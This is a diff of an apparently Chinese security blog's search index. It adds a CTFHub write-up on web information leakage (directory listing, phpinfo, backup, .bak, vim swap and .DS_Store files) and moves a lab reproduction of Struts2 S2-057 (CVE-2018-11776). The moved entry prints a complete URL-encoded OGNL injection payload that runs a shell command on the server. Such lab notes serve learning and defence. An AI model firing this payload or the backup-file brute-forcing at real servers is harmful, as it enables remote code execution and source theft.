@@ -91,10 +91,70 @@
 <p>检查安装情况<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080610.png" alt="image"></p>
 ]]></content>
       <categories>
-        <category>vulfocus靶场练习</category>
+        <category>Vulfocus靶场练习</category>
       </categories>
       <tags>
         <tag>Apache Shiro</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>web基础之信息泄露（上）</title>
+    <url>/2020/08/18/Web%E5%9F%BA%E7%A1%80/CTFHub%E9%A2%98%E8%A7%A3-Web%E5%9F%BA%E7%A1%80%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%88%E4%B8%8A%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081801.png" alt="image"></p>
+<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>许多的Web应用程序一般会有对服务器的文件读取查看的功能，大多会用到提交的参数来指明文件名。</p>
+<p>路径遍历漏洞隐藏一般在文件读取或者展示图片功能块这样的通过参数提交上来的文件名</p>
+<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081802.png" alt="image"></p>
+<p>点击之后会跳转到flag_in_here这个目录，挨个对里面的目录进行寻找拿到flag</p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081803.png" alt="image"><br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081804.png" alt="image"></p>
+<h2 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h2><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081805.png" alt="image"></p>
+<h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><p>PHPinfo：输出 PHP 当前状态的大量信息，包含了 PHP 编译选项、启用的扩展、PHP 版本、服务器信息和环境变量（如果编译为一个模块的话）、PHP环境变量、操作系统版本信息、path 变量、配置选项的本地值和主值、HTTP 头和PHP授权信息(License)。</p>
+<p>　　phpinfo() 同时是个很有价值的、包含所有 EGPCS(Environment, GET, POST, Cookie, Server) 数据的调试工具。</p>
+<h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p>打开是这样的~</p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081806.png" alt="image"></p>
+<p>浏览目录找到flag</p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081807.png" alt="image"></p>
+<h2 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a>备份文件下载</h2><h3 id="网站源码泄露"><a href="#网站源码泄露" class="headerlink" title="网站源码泄露"></a>网站源码泄露</h3><p>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081808.png" alt="image"></p>
+<h4 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h4><p>常见的网站源码的文件名有：’web’, ‘website’, ‘backup’, ‘back’, ‘www’, ‘wwwroot’, ‘temp’等等。</p>
+<p>常见的网站源码备份文件后缀有：’tar’, ‘tar.gz’, ‘zip’, ‘rar’等等。</p>
+<h4 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h4><p>只需在网站根目录对可能存在的备份文件名进行遍历爆破。就可以下载到网站源码。</p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081809.png" alt="image"></p>
+<h3 id="bak文件泄露"><a href="#bak文件泄露" class="headerlink" title="bak文件泄露"></a>bak文件泄露</h3><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081810.png" alt="image"></p>
+<h4 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h4><p>有些时候网站管理员可能为了方便，会在修改某个文件的时候先复制一份，将其命名为xxx.bak。而大部分Web Server对bak文件并不做任何处理，导致可以直接下载，从而获取到网站某个文件的源代码~</p>
+<h4 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h4><p>访问链接，看到这样：</p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081811.png" alt="image"></p>
+<p>flag在index.php的源码里，同时我们想到这是bak文件，试试访问</p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081812.png" alt="image"><br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081813.png" alt="image"></p>
+<p>用notepad++打开</p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081814.png" alt="image"></p>
+<h3 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h3><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081815.png" alt="image"></p>
+<h4 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h4><p>在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容</p>
+<p>以 index.php 为例：第一次产生的交换文件名为 <strong>.index.php.swp</strong></p>
+<p>再次意外退出后，将会产生名为 <strong>.index.php.swo</strong> 的交换文件</p>
+<p>第三次产生的交换文件则为 <strong>.index.php.swn</strong></p>
+<h4 id="题解-4"><a href="#题解-4" class="headerlink" title="题解"></a>题解</h4><p>将缓存文件下载下来，使用vim编辑原有文件，例如下载的 <strong>.index.php.swp</strong>，则说明之前编辑的文件名为<strong>index.php</strong></p>
+<p>会提示是否恢复，选择<strong>R</strong>进行恢复即可看到原始内容</p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081816.png" alt="image"><br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081817.png" alt="image"><br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081818.png" alt="image"></p>
+<h3 id="DS-Store文件泄露"><a href="#DS-Store文件泄露" class="headerlink" title=".DS_Store文件泄露"></a>.DS_Store文件泄露</h3><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081819.png" alt="image"></p>
+<h4 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h4><p>.DS_Store是Mac下Finder用来保存如何展示 文件/文件夹 的数据文件，每个文件夹下对应一个。</p>
+<p>如果开发/设计人员将.DS_Store上传部署到线上环境，可能造成文件目录结构泄漏，特别是备份文件、源代码文件。</p>
+<p>在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息。</p>
+<p>这里需要一个py脚本：<strong>Python-dsstore-master</strong></p>
+<h4 id="题解-5"><a href="#题解-5" class="headerlink" title="题解"></a>题解</h4><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081820.png" alt="image"></p>
+<p>进入Python-dsstore-master目录</p>
+<p>依次输入下图的命令：</p>
+<p>生成.DS_Store.ctfhub（名字可以自定义）</p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081821.png" alt="image"></p>
+<p>用Python-dsstore-master目录中的main.py对刚刚生成的文件.DS_Store.ctfhub进行解析。</p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081822.png" alt="image"></p>
+<p>访问我们看到的.txt文件得到flag</p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081823.png" alt="image"></p>
+]]></content>
+      <categories>
+        <category>Web基础</category>
+      </categories>
+      <tags>
+        <tag>信息泄露</tag>
       </tags>
   </entry>
   <entry>
@@ -202,7 +262,7 @@
 </ol>
 ]]></content>
       <categories>
-        <category>vulfocus靶场练习</category>
+        <category>Vulfocus靶场练习</category>
       </categories>
       <tags>
         <tag>Struts2</tag>
@@ -227,7 +287,7 @@
 <p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081404.png" alt="image"></p>
 ]]></content>
       <categories>
-        <category>vulfocus靶场练习</category>
+        <category>Vulfocus靶场练习</category>
       </categories>
       <tags>
         <tag>Struts2</tag>
@@ -247,7 +307,7 @@
 </ol>
 ]]></content>
       <categories>
-        <category>vulfocus靶场练习</category>
+        <category>Vulfocus靶场练习</category>
       </categories>
       <tags>
         <tag>Struts2</tag>
@@ -273,7 +333,7 @@
 <p>或直接使用工具<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081409.png" alt="image"></p>
 ]]></content>
       <categories>
-        <category>vulfocus靶场练习</category>
+        <category>Vulfocus靶场练习</category>
       </categories>
       <tags>
         <tag>Struts2</tag>
@@ -296,7 +356,7 @@
 </ol>
 ]]></content>
       <categories>
-        <category>vulfocus靶场练习</category>
+        <category>Vulfocus靶场练习</category>
       </categories>
       <tags>
         <tag>Struts2</tag>
@@ -316,29 +376,7 @@
 </ol>
 ]]></content>
       <categories>
-        <category>vulfocus靶场练习</category>
-      </categories>
-      <tags>
-        <tag>Struts2</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>S2-057 CVE-2018-11776复现过程</title>
-    <url>/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-057%20CVE-2018-11776%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>alwaysSelectFullNamespace为true。<br>action元素没有设置namespace属性，或者使用了通配符。<br>命名空间将由用户从url传递并解析为OGNL表达式，最终导致远程代码执行漏洞</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.3–2.3.34<br>Struts2.5–2.5.16</p>
-<a id="more"></a>
-<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
-<li><p>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081414.png" alt="image"></p>
-</li>
-<li><p>poc利用</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index&#x2F;%24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23a.getInputStream%28%29%29%29%7D&#x2F;actionChain1.action</span><br></pre></td></tr></table></figure>
-<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081415.png" alt="image"></p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>vulfocus靶场练习</category>
+        <category>Vulfocus靶场练习</category>
       </categories>
       <tags>
         <tag>Struts2</tag>
@@ -362,7 +400,29 @@
 <p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081417.png" alt="image"></p>
 ]]></content>
       <categories>
-        <category>vulfocus靶场练习</category>
+        <category>Vulfocus靶场练习</category>
+      </categories>
+      <tags>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>S2-057 CVE-2018-11776复现过程</title>
+    <url>/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-057%20CVE-2018-11776%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>alwaysSelectFullNamespace为true。<br>action元素没有设置namespace属性，或者使用了通配符。<br>命名空间将由用户从url传递并解析为OGNL表达式，最终导致远程代码执行漏洞</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.3–2.3.34<br>Struts2.5–2.5.16</p>
+<a id="more"></a>
+<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
+<li><p>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081414.png" alt="image"></p>
+</li>
+<li><p>poc利用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index&#x2F;%24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23a.getInputStream%28%29%29%29%7D&#x2F;actionChain1.action</span><br></pre></td></tr></table></figure>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081415.png" alt="image"></p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>Vulfocus靶场练习</category>
       </categories>
       <tags>
         <tag>Struts2</tag>
@@ -382,7 +442,7 @@
 </ol>
 ]]></content>
       <categories>
-        <category>vulfocus靶场练习</category>
+        <category>Vulfocus靶场练习</category>
       </categories>
       <tags>
         <tag>Struts2</tag>
@@ -413,7 +473,7 @@
 </ol>
 ]]></content>
       <categories>
-        <category>vulfocus靶场练习</category>
+        <category>Vulfocus靶场练习</category>
       </categories>
       <tags>
         <tag>Tomcat</tag>
@@ -440,7 +500,7 @@
 </ol>
 ]]></content>
       <categories>
-        <category>vulfocus靶场练习</category>
+        <category>Vulfocus靶场练习</category>
       </categories>
       <tags>
         <tag>Tomcat</tag>
@@ -500,7 +560,7 @@
 </ol>
 ]]></content>
       <categories>
-        <category>vulfocus靶场练习</category>
+        <category>Vulfocus靶场练习</category>
       </categories>
       <tags>
         <tag>Fastjson</tag>
